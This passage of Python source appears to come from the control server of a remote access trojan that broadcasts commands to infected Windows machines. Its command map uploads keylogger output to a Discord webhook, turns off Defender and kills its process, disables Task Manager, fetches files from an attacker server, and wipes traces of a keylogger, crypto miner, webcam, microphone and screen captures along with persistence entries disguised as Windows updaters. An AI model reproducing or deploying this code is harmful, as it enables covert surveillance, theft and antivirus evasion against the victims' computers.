                            f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'],

                        'recycle': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'],

                        'sleep': ['rundll32.exe powrprof.dll,SetSuspendState 0,1,0'],

                        'lock': ['rundll32.exe user32.dll,LockWorkStation'],

                        'rickroll': ['start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'],

                        'shutdown': ['shutdown /s /f /t 0'],

                        'off': ['shutdown /s /f /t 0'],

                        'restart': ['shutdown /r /f /t 0'],

                        'disable task manager': [
                            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'],

                        'enable task manager': [
                            'REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f'],

                        'killav': [

                            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',

                            'taskkill /F /IM MsMpEng.exe'

                        ],
                        'ffmpeg' : [f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar" && powershell -Command "if (Test-Path \'C:\\Program Files\\WinRAR\\WinRAR.exe\') {{ & \'C:\\Program Files\\WinRAR\\WinRAR.exe\' x -ibck -inul \'$env:USERPROFILE\\ffmpeg.rar\' \'$env:USERPROFILE\' }} elseif (Test-Path \'C:\\Program Files\\7-Zip\\7z.exe\') {{ & \'C:\\Program Files\\7-Zip\\7z.exe\' x -y \'$env:USERPROFILE\\ffmpeg.rar\' -o\'$env:USERPROFILE\' }} else {{ tar -xf \'$env:USERPROFILE\\ffmpeg.rar\' -C \'$env:USERPROFILE\' }}"'],
                        'logoff': ['shutdown /l /f'],
                        'selfdestruct': [
                            'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
                            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender Updater" /f & reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Screen Optimizer" /f',
                            'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & del /f /q "%USERPROFILE%\\mic.wav" 2>nul & rd /s /q "%APPDATA%\\MicrosoftUpdate" 2>nul',
                            'powershell -Command "Start-Sleep 2; Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
                        ]

                    }

                    actual_commands = command_map.get(cmd.lower(), [cmd])

                print(f"[*] Broadcasting '{cmd}' to {len(clients)} client(s)...")

                results = {}

                threads = []

                def send_to_client(cid):


                    client = client_manager.get_client(cid)

                    if not client:
                        results[cid] = "[ERROR: Client not found]"

                        return

                    conn = client['conn']

                    username = client['username']

                    all_outputs = []

                    try:

                        with client['lock']:

                            client['command_in_progress'] = True

                            for command in actual_commands:

                                if not client_manager._send_message(conn, f"CMD:{command}"):
                                    all_outputs.append(f"[ERROR: Failed to send command]")

                                    break

                                response = client_manager._recv_message(conn)

                                if response:

                                    output = response.decode('utf-8', errors='ignore')

                                    all_outputs.append(output)

                                else:

                                    all_outputs.append("[No response]")


                            results[cid] = {

                                'username': username,

                                'output': '\n'.join(all_outputs) if all_outputs else '[No output]'

                            }

                    except Exception as e:

                        results[cid] = f"[ERROR: {username} - {e}]"

                    finally:

                        client['command_in_progress'] = False


                for client_id in clients:
                    thread = threading.Thread(target=send_to_client, args=(client_id,))

                    thread.start()

                    threads.append(thread)


                for thread in threads:
                    thread.join(timeout=300)  #5 Minutes timeout per client


                print("\n" + "=" * 70)

                print("BROADCAST RESULTS")

                print("=" * 70)

                for cid, result in results.items():

                    if isinstance(result, dict):

                        print(f"\n[Client: {result['username']} (ID: {cid})]")

                        print(result['output'])

                        print("-" * 70)

                    else:

                        print(f"\n[Client ID: {cid}]")

                        print(result)

                        print("-" * 70)

                discord_logger(f"Broadcast command '{cmd}' to {len(clients)} clients")

            else:
                print("[!] Unknown command. Use 'list', 'connect', 'broadcast', or 'quit'")

    except KeyboardInterrupt:
        print("\n[+] Server interrupted")
    finally:
        # Cleanup
        print("[+] Cleaning up...")
        for cleanup_error in cleanup_managed_services():
            print(f"[!] Managed services cleanup error: {cleanup_error}")
        try:
            s.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()

